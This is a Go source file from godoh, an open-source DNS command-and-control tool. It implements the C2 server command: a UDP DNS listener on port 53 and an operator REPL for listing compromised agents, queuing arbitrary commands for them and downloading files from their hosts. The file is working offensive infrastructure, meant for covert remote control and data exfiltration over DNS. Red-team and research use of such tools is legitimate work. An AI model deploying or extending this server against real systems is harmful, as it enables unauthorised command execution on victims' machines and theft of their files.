package cmd

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/miekg/dns"
	"github.com/sensepost/godoh/dnsserver"
	"github.com/sensepost/godoh/protocol"
	"github.com/spf13/cobra"
)

var replPrompt = "c2"
var agentContext = ""

// c2Cmd represents the c2 command
var c2Cmd = &cobra.Command{
	Use:   "c2",
	Short: "Starts the godoh C2 server",
	Long: `Starts the godoh C2 server.

The implementation is pretty simple in that it will accept most communications
inbound, assuming a full DNS stream conversation is done.

Even though a global DNS provider is chosen as part of the base command, this
sub command cares little for that as any incoming, raw DNS packets are parsed.

Examples:
	godoh --domain example.com c2`,
	Run: func(cmd *cobra.Command, args []string) {
		log := options.Logger

		srv := &dns.Server{Addr: ":" + strconv.Itoa(53), Net: "udp"}
		h := &dnsserver.Handler{
			StreamSpool:  make(map[string]protocol.DNSBuffer),
			CommandSpool: make(map[string]protocol.Command), // only a single command per agent now
			Agents:       make(map[string]protocol.Agent),
			Log:          options.Logger,
		}
		srv.Handler = h

		go func() {
			log.Debug().Msg("dns c2 starting up")
			if err := srv.ListenAndServe(); err != nil {
				log.Fatal().Err(err).Msg("failed to start dns server")
			}
		}()

		help()

		// a small, simple REPL loop
		for {
			buf := bufio.NewReader(os.Stdin)
			fmt.Printf("%s> ", replPrompt)
			cmd, err := buf.ReadString('\n')
			if err != nil {
				fmt.Println(err)
				continue
			}

			cmd = strings.TrimSpace(cmd)

			// empty commands
			if cmd == "" {
				continue
			}

			if cmd == "exit" {
				break
			}

			if cmd == "help" {
				help()
				continue
			}

			if cmd == "agents" {
				if len(h.Agents) <= 0 {
					fmt.Println("No agents registered.")
					continue
				}

				for _, a := range h.Agents {
					fmt.Printf("Id: %s (Registered: %s) (Last Checkin: %s)\n",
						a.Identifier, a.FirstCheckin.Format("Mon Jan _2 15:04:05 2006"),
						a.LastCheckin.Format("Mon Jan _2 15:04:05 2006"))
					continue
				}

				continue
			}

			// Agent context switching
			if strings.HasPrefix(cmd, "use") && len(strings.Split(cmd, " ")) == 2 {

				newContext := strings.Split(cmd, " ")[1]
				_, ok := h.Agents[newContext]
				if !ok {
					fmt.Printf("Unknown agent `%s`\n", newContext)
					continue
				}

				agentContext = newContext

				// c2\foobar>
				replPrompt = replPrompt + `\` + agentContext
				continue
			}

			if cmd == "back" && agentContext != "" {
				agentContext = ""
				replPrompt = "c2"

				continue

			} else if cmd == "back" && agentContext == "" {

				fmt.Println("Not in agent context")
				continue
			}

			// Looks like we want to execute a command. Check context
			if agentContext == "" {
				fmt.Println("Need to `use agent` to execute a command!")
				continue
			}

			command := strings.TrimSuffix(cmd, "\n")

			// prepare and add the command
			c := protocol.Command{}
			c.Prepare(command)
			h.CommandSpool[agentContext] = c

			log.Info().Str("agent", agentContext).Str("command", command).Msg("command queued")
		}
	},
}

func init() {
	rootCmd.AddCommand(c2Cmd)
}

func help() {
	fmt.Println("Commands are directed to agents after switching to its context.")
	fmt.Println("")
	fmt.Println("Use the `agents` command to list agents.")
	fmt.Println("Use the `use agent-id` to interact with that agent and issue commands.")
	fmt.Println("Use the `download path` in an agents' context to download files.")
	fmt.Println("Use the `back` command to go back.")
	fmt.Println("")
	fmt.Printf("Current agent context: `%s`\n", agentContext)
	fmt.Println("")
}
